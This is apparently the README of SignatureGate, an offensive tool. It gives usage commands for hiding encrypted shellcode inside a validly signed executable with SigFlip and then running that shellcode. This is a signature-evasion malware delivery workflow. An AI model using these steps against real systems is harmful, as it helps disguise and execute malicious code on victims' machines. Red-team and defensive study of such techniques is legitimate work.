# SignatureGate

## Usage

Generate shellcode for .NET assembly with Donut.

Generate malicious signed executalbe with:


```
.\SigFlip.exe -i path_to_signed_binary -s path_to_malicious_shellcode -o path_to_output_file -e encryption_key
```

Run the malicious shellcode from the executable with

```
.\SignatureGate.exe path_to_malicious_file encryption_key
```
